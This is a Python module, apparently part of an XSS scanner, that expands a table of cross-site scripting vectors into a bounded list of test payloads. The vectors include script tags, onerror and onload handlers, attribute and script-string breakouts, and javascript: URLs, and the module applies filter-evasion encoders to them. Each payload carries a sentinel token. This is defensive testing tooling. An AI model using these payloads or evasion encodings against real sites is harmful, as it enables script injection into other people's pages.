"""Payload corpus builder.

Expands XSS attack vectors (OWASP XSS Filter Evasion Cheat Sheet families)
against context wrappers and strategy encoders into a bounded list of ready
injection strings. Every generated payload is a **test fixture for your own
lab app**; nothing is ever rendered or executed by this tool.

A payload is complete when it embeds a unique sentinel token the detector
keys on.
"""

from __future__ import annotations

import html
import secrets
from dataclasses import dataclass, field
from typing import Callable

from .contexts import Context, ContextSpec, CONTEXT_SPECS
from .encoders import (
    case_mix,
    html_dec_encode,
    html_hex_encode,
    js_hex_escape,
    js_string_mutation,
    js_unicode_escape,
)

Token = str


@dataclass(frozen=True)
class Vector:
    name: str
    category: str
    template: str
    contexts: tuple[str, ...] = field(default_factory=tuple)
    weight: float = 1.0


VECTORS: tuple[Vector, ...] = (
    Vector("script_alert", "basic", "<script>alert('{TOKEN}')</script>", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("img_onerror", "event_handler", "<img src=x onerror=alert('{TOKEN}')>", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("svg_onload", "event_handler", "<svg onload=alert('{TOKEN}')>", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("body_onload", "event_handler", "<body onload=alert('{TOKEN}')>", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("details_ontoggle", "event_handler", "<details open ontoggle=alert('{TOKEN}')>", ("html_element", "dom_innerhtml")),
    Vector("input_autofocus", "event_handler", "<input autofocus onfocus=alert('{TOKEN}')>", ("html_element", "dom_innerhtml")),
    Vector("iframe_srcdoc", "iframe", '<iframe srcdoc="<script>alert(\'{TOKEN}\')</script>"></iframe>', ("html_element", "dom_innerhtml", "attr_double", "attr_single")),
    Vector("javascript_href", "scheme", "javascript:alert('{TOKEN}')", ("attr_url", "url_query", "url_path")),
    Vector("attr_breakout_double", "breakout", '"><img src=x onerror=alert(\'{TOKEN}\')>', ("attr_double", "attr_single", "attr_unquoted", "attr_url")),
    Vector("attr_breakout_single", "breakout", "'><img src=x onerror=alert('{TOKEN}')>", ("attr_double", "attr_single", "attr_unquoted", "attr_url")),
    Vector("attr_unquoted_breakout", "breakout", "x onerror=alert('{TOKEN}')", ("attr_unquoted",)),
    Vector("attr_autofocus_onfocus", "event_handler", '" autofocus onfocus=alert(\'{TOKEN}\') x="', ("attr_double", "attr_single", "attr_unquoted")),
    Vector("script_breakout_sq", "breakout", "';alert('{TOKEN}');//", ("script_string",)),
    Vector("script_breakout_dq", "breakout", '";alert(\'{TOKEN}\');//', ("script_string",)),
    Vector("script_newline", "breakout", "%0aalert('{TOKEN}')//", ("script_string",)),
    Vector("js_breakout", "breakout", "</script><script>alert('{TOKEN}')</script>", ("script_string",)),
    Vector("dom_clobber", "dom", "<img src=x id=x onerror=document.body.setAttribute('data-xss','{TOKEN}')>", ("dom_innerhtml", "html_element")),
)


def _strategy_raw(tpl: str, name: str) -> str:
    return tpl


def _strategy_tagcase(tpl: str, name: str) -> str:
    tags = ["script", "img", "svg", "body", "details", "input", "iframe",
            "onerror", "onload", "onfocus", "ontoggle", "srcdoc", "autofocus"]
    return case_mix(tpl, *tags)


def _strategy_js_keyword(tpl: str, name: str) -> str:
    return js_string_mutation(tpl)


def _strategy_js_hex(tpl: str, name: str) -> str:
    return js_hex_escape(tpl)


def _strategy_js_unicode(tpl: str, name: str) -> str:
    return js_unicode_escape(tpl)


def _strategy_html_hex(tpl: str, name: str) -> str:
    return html_hex_encode(tpl)


def _strategy_html_dec(tpl: str, name: str) -> str:
    return html_dec_encode(tpl)


def _strategy_url(tpl: str, name: str, double: bool = False) -> str:
    from urllib.parse import quote

    def enc(s: str) -> str:
        return quote(s, safe="")

    s = enc(tpl)
    return enc(s) if double else s


def _strategy_attr_scheme(tpl: str, name: str) -> str:
    """Entity-encode only the letters of a `javascript:` scheme keyword."""
    if "javascript:" in tpl:
        out = tpl.replace("javascript:", "jav&#x61;script:")
    else:
        out = tpl
    return out.replace("JAVASCRIPT:", "JAV&#x41;SCRIPT:")


Strategy = tuple[str, tuple[Context, ...], Callable[[str, str], str]]

STRATEGIES: tuple[Strategy, ...] = (
    ("raw", (Context.HTML, Context.ATTR, Context.SCRIPT, Context.URL, Context.DOM), _strategy_raw),
    ("tagcase", (Context.HTML, Context.ATTR, Context.DOM), _strategy_tagcase),
    ("js_keyword", (Context.SCRIPT, Context.URL, Context.DOM), _strategy_js_keyword),
    ("js_hex", (Context.SCRIPT,), _strategy_js_hex),
    ("js_unicode", (Context.SCRIPT, Context.URL), _strategy_js_unicode),
    ("html_hex", (Context.HTML, Context.ATTR, Context.DOM), _strategy_html_hex),
    ("html_dec", (Context.HTML, Context.ATTR, Context.DOM), _strategy_html_dec),
    ("url", (Context.URL,), lambda t, n: _strategy_url(t, n)),
    ("double_url", (Context.URL,), lambda t, n: _strategy_url(t, n, double=True)),
    ("attr_scheme", (Context.ATTR, Context.URL), _strategy_attr_scheme),
)


@dataclass(frozen=True)
class Payload:
    vector_name: str
    category: str
    context: str
    strategy: str
    payload: str
    weight: float = 1.0


def build_candidates(
    categories: list[str],
    token: Token | None = None,
    max_payloads: int = 400,
) -> list[Payload]:
    """Expand categories x vectors x contexts x strategies into a bounded list."""
    token = token or _make_token()
    cat_set = set(categories)
    candidates: list[Payload] = []
    seen: set[tuple[str, str]] = set()

    specs: list[ContextSpec] = []
    for kinds in CONTEXT_SPECS.values():
        for spec in kinds:
            specs.append(spec)

    for spec in specs:
        for vector in VECTORS:
            if vector.category not in cat_set:
                continue
            if spec.name not in vector.contexts:
                continue
            for label, ctx_kinds, transformer in STRATEGIES:
                if spec.kind not in ctx_kinds:
                    continue
                if "script" in label and "script" not in vector.name and vector.category in ("breakout",):
                    continue
                filled = vector.template.replace("{TOKEN}", token)
                payload = transformer(filled, vector.name) if callable(transformer) else filled
                if len(payload) > 1500:
                    continue
                key = (spec.name, payload[:90])
                if key in seen:
                    continue
                seen.add(key)
                candidates.append(
                    Payload(
                        vector_name=vector.name,
                        category=vector.category,
                        context=spec.name,
                        strategy=label,
                        payload=payload,
                        weight=vector.weight,
                    )
                )
                if len(candidates) >= max_payloads:
                    return candidates
            if len(candidates) >= max_payloads:
                return candidates
        if len(candidates) >= max_payloads:
            return candidates
    return candidates


def _make_token() -> str:
    return f"xtok_{secrets.token_hex(5)}"


def html_escape_for(s: str) -> str:
    return html.escape(s, quote=True)